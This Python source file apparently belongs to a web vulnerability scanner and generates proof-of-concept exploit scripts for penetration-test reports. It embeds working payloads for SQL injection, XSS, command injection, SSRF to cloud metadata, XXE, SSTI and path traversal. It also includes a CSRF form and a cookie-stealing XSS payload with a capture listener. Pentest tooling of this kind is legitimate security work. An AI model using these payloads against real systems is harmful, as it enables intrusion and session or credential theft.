"""
Proof of Concept (PoC) Generator Module

Generates executable PoC scripts for discovered vulnerabilities.
Supports multiple output formats: Python, cURL, Burp Suite requests, and HTML forms.
"""

import html
from dataclasses import dataclass
from datetime import datetime
from typing import Any
from urllib.parse import urlparse


@dataclass
class PoCConfig:
    """Configuration for PoC generation"""

    include_python: bool = True
    include_curl: bool = True
    include_burp: bool = True
    include_html: bool = True
    obfuscate_payload: bool = False
    add_comments: bool = True


class PoCGenerator:
    """
    Generate Proof of Concept scripts for discovered vulnerabilities.

    Creates reproducible exploit scripts for pentesting reports and
    vulnerability validation.
    """

    def __init__(self, config: PoCConfig | None = None):
        self.config = config or PoCConfig()

    def generate_poc(self, vulnerability: dict[str, Any]) -> dict[str, str]:
        """
        Generate all PoC formats for a vulnerability.

        Args:
            vulnerability: Vulnerability dict with evidence data

        Returns:
            Dict with PoC scripts in different formats
        """
        poc_outputs = {}
        vuln_type = vulnerability.get("type", "unknown").lower()
        vulnerability.get("evidence", {})

        if self.config.include_python:
            poc_outputs["python"] = self._generate_python_poc(vulnerability)

        if self.config.include_curl:
            poc_outputs["curl"] = self._generate_curl_poc(vulnerability)

        if self.config.include_burp:
            poc_outputs["burp_request"] = self._generate_burp_request(vulnerability)

        if self.config.include_html and vuln_type in ["xss", "csrf"]:
            poc_outputs["html"] = self._generate_html_poc(vulnerability)

        # [UPGRADE] Add Nuclei Template Generation
        poc_outputs["nuclei"] = self._generate_nuclei_template(vulnerability)

        return poc_outputs

    def _generate_python_poc(self, vulnerability: dict[str, Any]) -> str:
        """Generate Python requests-based PoC script"""
        evidence = vulnerability.get("evidence", {})
        url = evidence.get("url", "https://example.com")
        method = evidence.get("method", "GET").upper()
        payload = evidence.get("payload", "")
        parameter = evidence.get("parameter", "q")
        # headers = evidence.get("headers", {})
        vuln_type = vulnerability.get("type", "").lower()

        # Base template
        lines = [
            "#!/usr/bin/env python3",
            '"""',
            f'Proof of Concept - {vulnerability.get("title", "Vulnerability PoC")}',
            f"Generated: {datetime.now().isoformat()}",
            f"Type: {vuln_type.upper()}",
            f'Severity: {vulnerability.get("severity", "Unknown")}',
            '"""',
            "",
            "import requests",
            "import sys",
            "",
            "# Target Configuration",
            f'TARGET_URL = "{url}"',
            f'VULNERABLE_PARAM = "{parameter}"',
            f"PAYLOAD = {repr(payload)}",
            "",
        ]

        # Add type-specific imports and setup
        if "config" in vuln_type or ("chain" in vuln_type and "config" in vulnerability.get("title", "").lower()):
            lines.extend(self._get_chain_config_poc(evidence))
        elif "account takeover" in vuln_type or "hijack" in vuln_type:
            lines.extend(self._get_chain_hijack_poc(evidence))
        elif vuln_type in ["sql_injection", "sqli"]:
            lines.extend(self._get_sqli_poc_body(evidence))
        elif vuln_type in ["xss", "xss_reflected", "xss_stored"]:
            lines.extend(self._get_xss_poc_body(evidence))
        elif vuln_type in ["command_injection", "cmdi"]:
            lines.extend(self._get_cmdi_poc_body(evidence))
        elif vuln_type == "ssrf" or "ssrf" in vuln_type or "cloud" in vuln_type:
            # Check if it is a cloud chain
            if "cloud" in vulnerability.get("title", "").lower():
                lines.extend(self._get_chain_ssrf_cloud_poc(evidence))
            else:
                lines.extend(self._get_ssrf_poc_body(evidence))
        elif vuln_type == "xxe":
            lines.extend(self._get_xxe_poc_body(evidence))
        elif vuln_type == "ssti":
            lines.extend(self._get_ssti_poc_body(evidence))
        elif vuln_type == "lfi":
            lines.extend(self._get_lfi_poc_body(evidence))
        else:
            lines.extend(self._get_generic_poc_body(evidence, method))

        return "\n".join(lines)

    def _get_sqli_poc_body(self, evidence: dict) -> list[str]:
        """SQLi specific PoC body"""
        return [
            "# SQL Injection Test Payloads",
            "SQLI_PAYLOADS = [",
            '    "\' OR 1=1 --",',
            '    "\' UNION SELECT NULL--",',
            '    "1; SELECT * FROM users--",',
            "    PAYLOAD,",
            "]",
            "",
            "def test_sqli():",
            '    """Test for SQL Injection vulnerability"""',
            "    session = requests.Session()",
            "    ",
            "    for payload in SQLI_PAYLOADS:",
            "        params = {VULNERABLE_PARAM: payload}",
            "        ",
            "        try:",
            "            response = session.get(TARGET_URL, params=params, timeout=10)",
            "            ",
            "            # Check for SQL error indicators",
            "            error_patterns = [",
            '                "sql syntax", "mysql", "sqlite", "postgresql",',
            '                "ora-", "sql server", "syntax error"',
            "            ]",
            "            ",
            "            content_lower = response.text.lower()",
            "            for pattern in error_patterns:",
            "                if pattern in content_lower:",
            '                    print(f"[!] SQL Error detected with payload: {payload}")',
            '                    print(f"    Response length: {len(response.text)}")',
            "                    return True",
            "                    ",
            "        except requests.RequestException as e:",
            '            print(f"[-] Request failed: {e}")',
            "            ",
            '    print("[*] No obvious SQL injection detected")',
            "    return False",
            "",
            'if __name__ == "__main__":',
            '    print("[*] SQL Injection PoC")',
            '    print(f"[*] Target: {TARGET_URL}")',
            "    test_sqli()",
        ]

    def _get_xss_poc_body(self, evidence: dict) -> list[str]:
        """XSS specific PoC body"""
        return [
            "# XSS Test Payloads",
            "XSS_PAYLOADS = [",
            '    "<script>alert(1)</script>",',
            '    "<img src=x onerror=alert(1)>",',
            '    "javascript:alert(1)",',
            "    PAYLOAD,",
            "]",
            "",
            "def test_xss():",
            '    """Test for XSS vulnerability"""',
            "    session = requests.Session()",
            "    ",
            "    for payload in XSS_PAYLOADS:",
            "        params = {VULNERABLE_PARAM: payload}",
            "        ",
            "        try:",
            "            response = session.get(TARGET_URL, params=params, timeout=10)",
            "            ",
            "            # Check if payload is reflected unescaped",
            "            if payload in response.text:",
            '                print(f"[!] XSS payload reflected: {payload}")',
            '                print(f"    URL: {response.url}")',
            "                return True",
            "                ",
            "        except requests.RequestException as e:",
            '            print(f"[-] Request failed: {e}")',
            "            ",
            '    print("[*] No reflected XSS detected")',
            "    return False",
            "",
            'if __name__ == "__main__":',
            '    print("[*] XSS PoC")',
            '    print(f"[*] Target: {TARGET_URL}")',
            "    test_xss()",
        ]

    def _get_cmdi_poc_body(self, evidence: dict) -> list[str]:
        """Command Injection specific PoC body"""
        return [
            "# Command Injection Test Payloads (Use responsibly!)",
            "CMDI_PAYLOADS = [",
            '    "; id",',
            '    "| whoami",',
            '    "`id`",',
            '    "$(whoami)",',
            "    PAYLOAD,",
            "]",
            "",
            "def test_cmdi():",
            '    """Test for Command Injection vulnerability"""',
            "    session = requests.Session()",
            "    ",
            "    # Baseline request",
            "    baseline = session.get(TARGET_URL, timeout=10)",
            "    baseline_length = len(baseline.text)",
            "    ",
            "    for payload in CMDI_PAYLOADS:",
            "        params = {VULNERABLE_PARAM: payload}",
            "        ",
            "        try:",
            "            response = session.get(TARGET_URL, params=params, timeout=10)",
            "            ",
            "            # Check for command output indicators",
            '            indicators = ["uid=", "root:", "www-data", "nobody"]',
            "            ",
            "            for ind in indicators:",
            "                if ind in response.text:",
            '                    print(f"[!] Command injection detected: {payload}")',
            "                    return True",
            "                    ",
            "        except requests.RequestException as e:",
            '            print(f"[-] Request failed: {e}")',
            "            ",
            '    print("[*] No obvious command injection detected")',
            "    return False",
            "",
            'if __name__ == "__main__":',
            '    print("[*] Command Injection PoC")',
            '    print(f"[*] Target: {TARGET_URL}")',
            "    test_cmdi()",
        ]

    def _get_ssrf_poc_body(self, evidence: dict) -> list[str]:
        """SSRF specific PoC body"""
        return [
            "# SSRF Test URLs",
            "SSRF_TARGETS = [",
            '    "http://127.0.0.1",',
            '    "http://localhost",',
            '    "http://169.254.169.254/latest/meta-data/",  # AWS metadata',
            '    "http://[::1]",',
            "    PAYLOAD,",
            "]",
            "",
            "def test_ssrf():",
            '    """Test for SSRF vulnerability"""',
            "    session = requests.Session()",
            "    ",
            "    for target in SSRF_TARGETS:",
            "        params = {VULNERABLE_PARAM: target}",
            "        ",
            "        try:",
            "            response = session.get(TARGET_URL, params=params, timeout=10)",
            "            ",
            "            # Check for internal resource indicators",
            '            if any(x in response.text.lower() for x in ["localhost", "127.0.0.1", "ami-id", "instance-id"]):',
            '                print(f"[!] SSRF detected with target: {target}")',
            "                return True",
            "                ",
            "        except requests.RequestException as e:",
            '            print(f"[-] Request failed: {e}")',
            "            ",
            '    print("[*] Setup OOB server for blind SSRF detection")',
            "    return False",
            "",
            'if __name__ == "__main__":',
            '    print("[*] SSRF PoC")',
            '    print(f"[*] Target: {TARGET_URL}")',
            "    test_ssrf()",
        ]

    def _get_xxe_poc_body(self, evidence: dict) -> list[str]:
        """XXE specific PoC body"""
        return [
            "# XXE Payload",
            'XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>',
            "<!DOCTYPE foo [",
            "  <!ELEMENT foo ANY>",
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">',
            "]>",
            '<foo>&xxe;</foo>"""',
            "",
            "def test_xxe():",
            '    """Test for XXE vulnerability"""',
            "    session = requests.Session()",
            "    ",
            '    headers = {"Content-Type": "application/xml"}',
            "    ",
            "    try:",
            "        response = session.post(",
            "            TARGET_URL,",
            "            data=XXE_PAYLOAD,",
            "            headers=headers,",
            "            timeout=10",
            "        )",
            "        ",
            "        # Check for /etc/passwd content",
            '        if "root:" in response.text or "nobody:" in response.text:',
            '            print("[!] XXE vulnerability confirmed!")',
            '            print(f"    File content leaked in response")',
            "            return True",
            "            ",
            "    except requests.RequestException as e:",
            '        print(f"[-] Request failed: {e}")',
            "        ",
            '    print("[*] Try OOB XXE for blind detection")',
            "    return False",
            "",
            'if __name__ == "__main__":',
            '    print("[*] XXE PoC")',
            '    print(f"[*] Target: {TARGET_URL}")',
            "    test_xxe()",
        ]

    def _get_ssti_poc_body(self, evidence: dict) -> list[str]:
        """SSTI specific PoC body"""
        return [
            "# SSTI Detection Payloads",
            "SSTI_PAYLOADS = [",
            '    ("{{7*7}}", "49"),  # Jinja2/Twig',
            '    ("${7*7}", "49"),   # Freemarker',
            '    ("#{7*7}", "49"),   # Ruby ERB',
            '    ("<%= 7*7 %>", "49"),  # EJS',
            "]",
            "",
            "def test_ssti():",
            '    """Test for SSTI vulnerability"""',
            "    session = requests.Session()",
            "    ",
            "    for payload, expected in SSTI_PAYLOADS:",
            "        params = {VULNERABLE_PARAM: payload}",
            "        ",
            "        try:",
            "            response = session.get(TARGET_URL, params=params, timeout=10)",
            "            ",
            "            if expected in response.text:",
            '                print(f"[!] SSTI detected with payload: {payload}")',
            '                print(f"    Expected {expected} found in response")',
            "                return True",
            "                ",
            "        except requests.RequestException as e:",
            '            print(f"[-] Request failed: {e}")',
            "            ",
            '    print("[*] No SSTI detected")',
            "    return False",
            "",
            'if __name__ == "__main__":',
            '    print("[*] SSTI PoC")',
            '    print(f"[*] Target: {TARGET_URL}")',
            "    test_ssti()",
        ]

    def _get_lfi_poc_body(self, evidence: dict) -> list[str]:
        """LFI specific PoC body"""
        return [
            "# LFI Test Paths",
            "LFI_PAYLOADS = [",
            '    "../../../etc/passwd",',
            '    "....//....//....//etc/passwd",',
            '    "/etc/passwd%00",',
            '    "..%252f..%252f..%252fetc/passwd",',
            "    PAYLOAD,",
            "]",
            "",
            "def test_lfi():",
            '    """Test for LFI vulnerability"""',
            "    session = requests.Session()",
            "    ",
            "    for payload in LFI_PAYLOADS:",
            "        params = {VULNERABLE_PARAM: payload}",
            "        ",
            "        try:",
            "            response = session.get(TARGET_URL, params=params, timeout=10)",
            "            ",
            '            if "root:" in response.text or "nobody:" in response.text:',
            '                print(f"[!] LFI confirmed with: {payload}")',
            "                return True",
            "                ",
            "        except requests.RequestException as e:",
            '            print(f"[-] Request failed: {e}")',
            "            ",
            '    print("[*] No LFI detected")',
            "    return False",
            "",
            'if __name__ == "__main__":',
            '    print("[*] LFI PoC")',
            '    print(f"[*] Target: {TARGET_URL}")',
            "    test_lfi()",
        ]

    def _get_generic_poc_body(self, evidence: dict, method: str) -> list[str]:
        """Generic PoC body for unknown vulnerability types"""
        return [
            "def test_vulnerability():",
            '    """Generic vulnerability test"""',
            "    session = requests.Session()",
            "    ",
            "    params = {VULNERABLE_PARAM: PAYLOAD}",
            "    ",
            "    try:",
            f"        response = session.{method.lower()}(",
            "            TARGET_URL,",
            '            params=params if response.request.method == "GET" else None,',
            '            data=params if response.request.method == "POST" else None,',
            "            timeout=10",
            "        )",
            "        ",
            '        print(f"[*] Response Status: {response.status_code}")',
            '        print(f"[*] Response Length: {len(response.text)}")',
            "        ",
            "        if PAYLOAD in response.text:",
            '            print("[!] Payload reflected in response")',
            "            return True",
            "            ",
            "    except requests.RequestException as e:",
            '        print(f"[-] Request failed: {e}")',
            "        ",
            "    return False",
            "",
            'if __name__ == "__main__":',
            '    print("[*] Vulnerability PoC")',
            '    print(f"[*] Target: {TARGET_URL}")',
            "    test_vulnerability()",
        ]

    def _generate_curl_poc(self, vulnerability: dict[str, Any]) -> str:
        """Generate cURL command for the vulnerability"""
        evidence = vulnerability.get("evidence", {})
        url = evidence.get("url", "https://example.com")
        method = evidence.get("method", "GET").upper()
        payload = evidence.get("payload", "")
        parameter = evidence.get("parameter", "q")
        headers = evidence.get("headers", {})
        body = evidence.get("body", "")

        lines = [
            f"# PoC: {vulnerability.get('title', 'Vulnerability')}",
            f"# Severity: {vulnerability.get('severity', 'Unknown')}",
            "",
        ]

        # Build curl command
        curl_parts = ["curl -v"]

        # Method
        if method != "GET":
            curl_parts.append(f"-X {method}")

        # Headers
        for header, value in headers.items():
            curl_parts.append(f"-H '{header}: {value}'")

        # Add common headers if not present
        if "User-Agent" not in headers:
            curl_parts.append("-H 'User-Agent: Mozilla/5.0 (Security Scanner)'")

        # Body/Data
        if method == "POST":
            if body:
                curl_parts.append(f"-d '{body}'")
            else:
                curl_parts.append(f"-d '{parameter}={payload}'")

        # URL with parameters for GET
        if method == "GET" and payload:
            encoded_payload = payload.replace("'", "\\'")
            final_url = f"{url}?{parameter}={encoded_payload}"
            curl_parts.append(f"'{final_url}'")
        else:
            curl_parts.append(f"'{url}'")

        lines.append(" \\\n  ".join(curl_parts))

        return "\n".join(lines)

    def _generate_burp_request(self, vulnerability: dict[str, Any]) -> str:
        """Generate Burp Suite compatible HTTP request"""
        evidence = vulnerability.get("evidence", {})
        url = evidence.get("url", "https://example.com")
        method = evidence.get("method", "GET").upper()
        payload = evidence.get("payload", "")
        parameter = evidence.get("parameter", "q")
        headers = evidence.get("headers", {})
        body = evidence.get("body", "")

        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or "/"

        # Build query string for GET
        if method == "GET" and payload:
            path = f"{path}?{parameter}={payload}"

        lines = [
            f"{method} {path} HTTP/1.1",
            f"Host: {host}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: close",
        ]

        # Add custom headers
        for header, value in headers.items():
            if header.lower() not in ["host", "user-agent", "accept"]:
                lines.append(f"{header}: {value}")

        # Add body for POST
        if method == "POST":
            post_body = body or f"{parameter}={payload}"
            lines.append(f"Content-Length: {len(post_body)}")
            lines.append("Content-Type: application/x-www-form-urlencoded")
            lines.append("")
            lines.append(post_body)
        else:
            lines.append("")

        return "\n".join(lines)

    def _generate_html_poc(self, vulnerability: dict[str, Any]) -> str:
        """Generate HTML PoC page for XSS/CSRF"""
        evidence = vulnerability.get("evidence", {})
        url = evidence.get("url", "https://example.com")
        method = evidence.get("method", "GET").upper()
        payload = evidence.get("payload", "")
        parameter = evidence.get("parameter", "q")
        vuln_type = vulnerability.get("type", "").lower()

        if "xss" in vuln_type:
            return self._generate_xss_html_poc(url, parameter, payload)
        elif "csrf" in vuln_type:
            return self._generate_csrf_html_poc(url, parameter, payload, method)

        return ""

    def _generate_xss_html_poc(self, url: str, parameter: str, payload: str) -> str:
        """Generate XSS HTML PoC"""
        escaped_payload = html.escape(payload)
        encoded_url = f"{url}?{parameter}={payload}"

        return f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .warning {{ background: #ffebee; border: 1px solid #f44336; padding: 20px; border-radius: 4px; }}
        .code {{ background: #f5f5f5; padding: 10px; font-family: monospace; overflow-x: auto; }}
        a {{ color: #1976d2; }}
    </style>
</head>
<body>
    <h1>🔴 XSS Proof of Concept</h1>

    <div class="warning">
        <strong>⚠️ Warning:</strong> This PoC demonstrates a Cross-Site Scripting vulnerability.
        Only use on systems you have authorization to test.
    </div>

    <h2>Vulnerability Details</h2>
    <ul>
        <li><strong>URL:</strong> <code>{html.escape(url)}</code></li>
        <li><strong>Parameter:</strong> <code>{parameter}</code></li>
        <li><strong>Payload:</strong> <code>{escaped_payload}</code></li>
    </ul>

    <h2>PoC Link</h2>
    <p>Click the link below to trigger the XSS:</p>
    <div class="code">
        <a href="{html.escape(encoded_url)}" target="_blank">{html.escape(encoded_url)}</a>
    </div>

    <h2>Remediation</h2>
    <ul>
        <li>Implement proper output encoding based on context</li>
        <li>Use Content-Security-Policy headers</li>
        <li>Validate and sanitize all user input</li>
    </ul>
</body>
</html>"""

    def _generate_csrf_html_poc(self, url: str, parameter: str, payload: str, method: str) -> str:
        """Generate CSRF HTML PoC"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .warning {{ background: #ffebee; border: 1px solid #f44336; padding: 20px; border-radius: 4px; }}
        button {{ background: #f44336; color: white; padding: 10px 20px; border: none; cursor: pointer; }}
    </style>
</head>
<body>
    <h1>🔴 CSRF Proof of Concept</h1>

    <div class="warning">
        <strong>⚠️ Warning:</strong> This PoC demonstrates a Cross-Site Request Forgery vulnerability.
        Only use on systems you have authorization to test.
    </div>

    <h2>Manual Trigger</h2>
    <form action="{html.escape(url)}" method="{method.upper()}">
        <input type="hidden" name="{parameter}" value="{html.escape(payload)}">
        <button type="submit">Execute CSRF Attack</button>
    </form>

    <h2>Auto-Submit (Uncomment to enable)</h2>
    <script>
    // Uncomment the line below for auto-submit
    // document.forms[0].submit();
    </script>

    <h2>Remediation</h2>
    <ul>
        <li>Implement anti-CSRF tokens</li>
        <li>Verify Origin/Referer headers</li>
        <li>Use SameSite cookie attribute</li>
    </ul>
</body>
</html>"""

    def _get_chain_config_poc(self, evidence: dict) -> list[str]:
        """Generates PoC to verify Config Leak credentials."""
        # Evidence might contain 'found_secrets' or raw snippet
        return [
            "# Config Leak Verification",
            "def verify_leak():",
            "    session = requests.Session()",
            "    try:",
            "        response = session.get(TARGET_URL, timeout=10)",
            "        if response.status_code == 200:",
            '            print("[!] Sensitive file is accessible.")',
            '            print(f"    Size: {len(response.text)} bytes")',
            "            # Manual verification hint",
            '            print("[*] Manual Verification:")',
            '            print("    1. Check if AWS keys work: aws sts get-caller-identity --access-key-id ...")',
            '            print("    2. Check DB connection strings.")',
            "            return True",
            "    except Exception as e:",
            '        print(f"[-] Failed to access file: {e}")',
            "    return False",
            "",
            'if __name__ == "__main__":',
            "    verify_leak()",
        ]

    def _get_chain_ssrf_cloud_poc(self, evidence: dict) -> list[str]:
        """Generates PoC to verify SSRF Cloud Metadata Access."""
        return [
            "# SSRF Cloud Takeover Verification",
            "def verify_cloud_ssrf():",
            "    session = requests.Session()",
            "    # Payload specific to the targeted cloud provider usually",
            "    payload = PAYLOAD  # http://169.254.169.254/latest/meta-data",
            "    params = {VULNERABLE_PARAM: payload}",
            "    ",
            "    try:",
            '        print(f"[*] Attempting to fetch Cloud Metadata via {VULNERABLE_PARAM}...")',
            "        response = session.get(TARGET_URL, params=params, timeout=10)",
            "        ",
            '        if "instance-id" in response.text or "ami-id" in response.text or "Compute Engine" in response.text:',
            '            print("[!] CRITICAL: Cloud Metadata Accessed!")',
            '            print(f"    Snippet: {response.text[:100]}...")',
            "            return True",
            "        else:",
            '            print("[-] Metadata not clearly visible in response.")',
            "    except Exception as e:",
            '        print(f"[-] Request failed: {e}")',
            "    ",
            "    return False",
            "",
            'if __name__ == "__main__":',
            "    verify_cloud_ssrf()",
        ]

    def _get_chain_hijack_poc(self, evidence: dict) -> list[str]:
        """Generates PoC for session hijacking via XSS."""
        cookie_names = evidence.get("data", {}).get("vulnerable_cookies", ["sessionid"])
        return [
            "# Account Takeover via XSS Verification",
            "# This script sets up a local listener to capture stolen cookies.",
            "import http.server",
            "import socketserver",
            "import threading",
            "import time",
            "",
            "PORT = 8888",
            "",
            "class CookieStealer(http.server.SimpleHTTPRequestHandler):",
            "    def log_message(self, format, *args):",
            "        # Override to print captured data to console",
            "        if 'GET' in args[0]:",
            "             print(f'[+] VICTIM REQUEST CAPTURED: {args[0]}')",
            "",
            "def start_listener():",
            "    with socketserver.TCPServer(('', PORT), CookieStealer) as httpd:",
            "        print(f'[*] Listener started on port {PORT}')",
            "        print('[*] Waiting for victim...')",
            "        httpd.serve_forever()",
            "",
            "def generate_payload():",
            f"    # Payload that steals {cookie_names}",
            '    return "<script>location=\'http://localhost:" + str(PORT) + "/?cookie=\'+document.cookie</script>"',
            "",
            "if __name__ == '__main__':",
            "    payload = generate_payload()",
            "    print(f'[*] Generated XSS Payload: {payload}')",
            "    print(f'[*] Inject this payload into parameter: {VULNERABLE_PARAM}')",
            "    print('[*] Starting listener... Press Ctrl+C to stop.')",
            "    start_listener()",
        ]

    def _generate_nuclei_template(self, vulnerability: dict[str, Any]) -> str:
        """
        Generate a Nuclei template (YAML) for the vulnerability.
        This provides a standardized, portable exploit definition.
        """
        evidence = vulnerability.get("evidence", {})
        url = evidence.get("url", "https://example.com")
        method = evidence.get("method", "GET").upper()
        payload = evidence.get("payload", "")
        parameter = evidence.get("parameter", "q")
        vuln_type = vulnerability.get("type", "unknown").lower()
        title = vulnerability.get("title", "Unknown Vulnerability").replace('"', "'")
        severity = vulnerability.get("severity", "info").lower()
        timestamp = datetime.now().isoformat()

        # Determine appropriate matcher based on vuln type
        matchers = ""
        if "sql" in vuln_type:
            matchers = """
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_"
          - "ORA-"
      - type: status
        status:
          - 500"""
        elif "xss" in vuln_type:
            matchers = f"""
    matchers:
      - type: word
        words:
          - "{payload}"
        part: body"""
        elif "ssrf" in vuln_type or "lfi" in vuln_type:
            matchers = """
    matchers:
      - type: regex
        regex:
          - "root:x:0:0"
          - "instance-id"
          - "ami-id" """
        else:
            matchers = """
    matchers:
      - type: status
        status:
          - 200"""

        # Construct YAML
        template = f"""id: sentinel-generated-{int(datetime.now().timestamp())}

info:
  name: {title}
  author: SENTINEL-AI
  severity: {severity}
  description: Auto-generated PoC by Sentinel Scanner.
  created: {timestamp}
  tags: {vuln_type},sentinel

http:
  - method: {method}
    path:
      - "{{{{BaseURL}}}}{urlparse(url).path}?{parameter}={payload}" if method == "GET" else "{{{{BaseURL}}}}{urlparse(url).path}"

    headers:
      User-Agent: Sentinel/Elite-Scanner
    """

        if method == "POST":
            body = evidence.get("body", f"{parameter}={payload}")
            template += f"""
    body: "{body}"
"""
        template += matchers
        return template


def generate_poc_for_vulnerability(vulnerability: dict[str, Any]) -> dict[str, str]:
    """
    Convenience function to generate PoC for a vulnerability.

    Args:
        vulnerability: Vulnerability dict from scanner

    Returns:
        Dict with PoC scripts in different formats
    """
    generator = PoCGenerator()
    return generator.generate_poc(vulnerability)
